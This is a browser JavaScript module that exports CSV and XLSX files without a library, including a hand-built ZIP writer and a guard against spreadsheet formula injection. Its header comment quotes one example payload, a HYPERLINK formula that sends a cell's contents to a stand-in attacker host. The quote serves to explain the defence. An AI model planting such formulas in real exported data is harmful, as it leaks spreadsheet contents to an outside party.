/* ============================================================
   EXPORT-CORE.JS
   Phase 6F. Writing CSV and XLSX in the browser, with no library.

   WHY NOT A LIBRARY

   The site has no build step and ships every script as a plain file.
   SheetJS would be a second CDN dependency for one feature, and the
   whole of what is needed here is a ZIP container with no compression
   and five small XML files. That is about 150 lines and it can be
   read, which a minified bundle cannot.

   THE FORMULA INJECTION PROBLEM

   This is the part of a CSV exporter that is easy to get wrong and
   expensive to get wrong. Excel, Numbers and Google Sheets treat a
   cell beginning with =, +, -, @, tab or carriage return as a
   FORMULA, not as text. Power Board exports note bodies the founder
   typed, so a note that begins with

     =HYPERLINK("https://evil.example/"&A1,"click")

   becomes a live formula in the recipient's spreadsheet. The founder
   typed it, so it is their own data, but they typed it as a note and
   it must come back as a note.

   Every cell is checked and neutralised with a leading apostrophe,
   which spreadsheets strip on display and never evaluate. It is done
   in CSV and in XLSX both: the XLSX path writes inline strings, and a
   string cell is not evaluated, but a founder who exports xlsx and
   saves-as csv would otherwise reintroduce the hole.

   RFC 4180, AND A BOM

   Fields containing a comma, a quote, CR or LF are wrapped in quotes
   with inner quotes doubled. The file starts with a UTF-8 BOM,
   without which Excel on Windows reads accented investor names as
   mojibake. The BOM is invisible to every other reader.
   ============================================================ */

/* Characters a spreadsheet treats as the start of a formula. Tab and
   CR are included because Excel strips leading whitespace before
   deciding, so "\t=1+1" is still a formula. */
const XC_FORMULA_LEAD = /^[=+\-@\t\r]/;

/* The control characters XML 1.0 forbids. Tab, newline and carriage
   return are NOT in this set: a multi-line note keeps its lines. */
const XC_CONTROL = /[\x00-\x08\x0B\x0C\x0E-\x1F]/g;

function xcCell(v) {
  if (v == null) return '';
  if (v instanceof Date) return isNaN(v.getTime()) ? '' : v.toISOString();
  /* Stripped here rather than only in the XML escape, so CSV and XLSX
     produce the same text. They did not at first: a stray control
     character from a pasted note vanished in the workbook and
     survived in the csv, which meant the two files disagreed about
     what the founder had written. */
  let s = String(v).replace(XC_CONTROL, '');
  /* Neutralise before quoting, so the apostrophe is inside the quoted
     field rather than outside it. */
  if (XC_FORMULA_LEAD.test(s)) s = "'" + s;
  return s;
}

function xcCsvField(v) {
  const s = xcCell(v);
  return /[",\r\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
}

/* rows is an array of arrays. The header is just the first row: a
   sheet with no rows still gets its header, so an empty export opens
   as an empty table rather than an empty file. */
function xcCsv(rows) {
  return '﻿' + rows.map(function (r) {
    return r.map(xcCsvField).join(',');
  }).join('\r\n') + '\r\n';
}

/* ------------------------------------------------------------
   XLSX

   A spreadsheet is a ZIP of XML. Nothing here is compressed: STORE
   is a valid ZIP method, Excel accepts it, and it removes the need
   for a deflate implementation. The files are small enough that the
   size difference does not matter.
   ------------------------------------------------------------ */

function xcXmlEsc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&apos;')
    /* XML 1.0 forbids most control characters outright. A stray one
       from a pasted note would make the whole workbook unopenable,
       which is a worse outcome than losing the character. */
    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, '');
}

/* A1, B1 ... Z1, AA1. Written out rather than assumed, because a
   pipeline export can exceed 26 columns once the optional groups are
   switched on. */
function xcColName(i) {
  let s = '';
  i = i + 1;
  while (i > 0) {
    const r = (i - 1) % 26;
    s = String.fromCharCode(65 + r) + s;
    i = Math.floor((i - 1) / 26);
  }
  return s;
}

function xcSheetXml(rows) {
  const body = rows.map(function (row, r) {
    const cells = row.map(function (v, c) {
      const s = xcCell(v);
      if (s === '') return '';
      /* Everything is written as an inline string, including things
         that look like numbers. A firm called "3i" and a date like
         2026-01-05 are both mangled by a spreadsheet's own type
         guessing, and an export that changes its own values is worse
         than one that keeps them all as text. */
      return '<c r="' + xcColName(c) + (r + 1) + '" t="inlineStr">' +
        '<is><t xml:space="preserve">' + xcXmlEsc(s) + '</t></is></c>';
    }).join('');
    return '<row r="' + (r + 1) + '">' + cells + '</row>';
  }).join('');

  return '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">' +
    '<sheetData>' + body + '</sheetData></worksheet>';
}

/* Excel rejects these characters in a sheet name and caps it at 31.
   A silently truncated duplicate would also break the workbook, so
   the caller is responsible for uniqueness and this only sanitises. */
function xcSheetName(name, i) {
  let s = String(name || ('Sheet' + (i + 1))).replace(/[\\/?*\[\]:]/g, ' ').trim();
  if (s.length > 31) s = s.slice(0, 31);
  return s || ('Sheet' + (i + 1));
}

function xcXlsx(sheets) {
  const names = sheets.map(function (s, i) { return xcSheetName(s.name, i); });

  const files = [];
  files.push({
    name: '[Content_Types].xml',
    data: '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
      '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
      '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
      '<Default Extension="xml" ContentType="application/xml"/>' +
      '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>' +
      sheets.map(function (s, i) {
        return '<Override PartName="/xl/worksheets/sheet' + (i + 1) + '.xml" ' +
          'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>';
      }).join('') +
      '</Types>'
  });
  files.push({
    name: '_rels/.rels',
    data: '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
      '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
      '<Relationship Id="rId1" ' +
      'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" ' +
      'Target="xl/workbook.xml"/></Relationships>'
  });
  files.push({
    name: 'xl/workbook.xml',
    data: '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
      '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" ' +
      'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets>' +
      names.map(function (n, i) {
        return '<sheet name="' + xcXmlEsc(n) + '" sheetId="' + (i + 1) + '" r:id="rId' + (i + 1) + '"/>';
      }).join('') +
      '</sheets></workbook>'
  });
  files.push({
    name: 'xl/_rels/workbook.xml.rels',
    data: '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
      '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
      sheets.map(function (s, i) {
        return '<Relationship Id="rId' + (i + 1) + '" ' +
          'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" ' +
          'Target="worksheets/sheet' + (i + 1) + '.xml"/>';
      }).join('') +
      '</Relationships>'
  });
  sheets.forEach(function (s, i) {
    files.push({ name: 'xl/worksheets/sheet' + (i + 1) + '.xml', data: xcSheetXml(s.rows || []) });
  });

  return xcZip(files);
}

/* ------------------------------------------------------------
   ZIP

   Stored (method 0), which needs no deflate. Every field is
   little-endian. A wrong CRC or a wrong offset is the usual reason a
   generated workbook will not open, so both are computed rather than
   guessed at.
   ------------------------------------------------------------ */

let _xcCrcTable = null;
function xcCrcTable() {
  if (_xcCrcTable) return _xcCrcTable;
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
    t[n] = c >>> 0;
  }
  _xcCrcTable = t;
  return t;
}

function xcCrc32(bytes) {
  const t = xcCrcTable();
  let c = 0xFFFFFFFF;
  for (let i = 0; i < bytes.length; i++) c = t[(c ^ bytes[i]) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
}

function xcUtf8(s) {
  if (typeof TextEncoder !== 'undefined') return new TextEncoder().encode(s);
  /* No TextEncoder is not expected in any browser this site supports,
     but a silent mis-encoding would corrupt the file rather than fail
     it, so the fallback is explicit. */
  const out = [];
  for (let i = 0; i < s.length; i++) {
    let c = s.charCodeAt(i);
    if (c < 0x80) out.push(c);
    else if (c < 0x800) out.push(0xC0 | (c >> 6), 0x80 | (c & 63));
    else out.push(0xE0 | (c >> 12), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
  }
  return new Uint8Array(out);
}

function xcZip(files) {
  const parts = [];
  const central = [];
  let offset = 0;

  function u16(n) { return [n & 0xFF, (n >>> 8) & 0xFF]; }
  function u32(n) { return [n & 0xFF, (n >>> 8) & 0xFF, (n >>> 16) & 0xFF, (n >>> 24) & 0xFF]; }

  files.forEach(function (f) {
    const nameBytes = xcUtf8(f.name);
    const dataBytes = xcUtf8(f.data);
    const crc = xcCrc32(dataBytes);

    /* Bit 11 marks the name as UTF-8. All names here are ASCII, but
       setting it costs nothing and is correct. Time and date are
       fixed rather than "now": a deterministic file is easier to
       diff, and no reader shows them. */
    const flag = 0x0800;
    const header = [].concat(
      u32(0x04034b50), u16(20), u16(flag), u16(0),
      u16(0), u16(0x21),                     /* 1980-01-01 */
      u32(crc), u32(dataBytes.length), u32(dataBytes.length),
      u16(nameBytes.length), u16(0)
    );
    parts.push(new Uint8Array(header), nameBytes, dataBytes);

    central.push({
      crc: crc, size: dataBytes.length, nameBytes: nameBytes, offset: offset, flag: flag
    });
    offset += header.length + nameBytes.length + dataBytes.length;
  });

  const cdStart = offset;
  central.forEach(function (c) {
    const rec = [].concat(
      u32(0x02014b50), u16(20), u16(20), u16(c.flag), u16(0),
      u16(0), u16(0x21),
      u32(c.crc), u32(c.size), u32(c.size),
      u16(c.nameBytes.length), u16(0), u16(0), u16(0), u16(0),
      u32(0), u32(c.offset)
    );
    parts.push(new Uint8Array(rec), c.nameBytes);
    offset += rec.length + c.nameBytes.length;
  });

  const eocd = [].concat(
    u32(0x06054b50), u16(0), u16(0),
    u16(central.length), u16(central.length),
    u32(offset - cdStart), u32(cdStart), u16(0)
  );
  parts.push(new Uint8Array(eocd));

  let total = 0;
  parts.forEach(function (p) { total += p.length; });
  const out = new Uint8Array(total);
  let at = 0;
  parts.forEach(function (p) { out.set(p, at); at += p.length; });
  return out;
}

/* ------------------------------------------------------------
   DOWNLOAD
   ------------------------------------------------------------ */

function xcSafeName(s) {
  return String(s || 'export').toLowerCase()
    .replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '').slice(0, 60) || 'export';
}

function xcDownload(filename, data, mime) {
  const blob = (data instanceof Uint8Array)
    ? new Blob([data], { type: mime })
    : new Blob([data], { type: mime + ';charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  /* Revoking immediately can cancel the download in some browsers,
     so it is deferred by a tick rather than called inline. */
  setTimeout(function () { URL.revokeObjectURL(url); }, 1000);
}

function xcDownloadCsv(name, rows) {
  xcDownload(xcSafeName(name) + '.csv', xcCsv(rows), 'text/csv');
}

function xcDownloadXlsx(name, sheets) {
  xcDownload(xcSafeName(name) + '.xlsx', xcXlsx(sheets),
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    xcCell: xcCell, xcCsvField: xcCsvField, xcCsv: xcCsv,
    xcXlsx: xcXlsx, xcZip: xcZip, xcCrc32: xcCrc32, xcColName: xcColName,
    xcSheetXml: xcSheetXml, xcSheetName: xcSheetName, xcXmlEsc: xcXmlEsc,
    xcSafeName: xcSafeName, XC_FORMULA_LEAD: XC_FORMULA_LEAD
  };
}
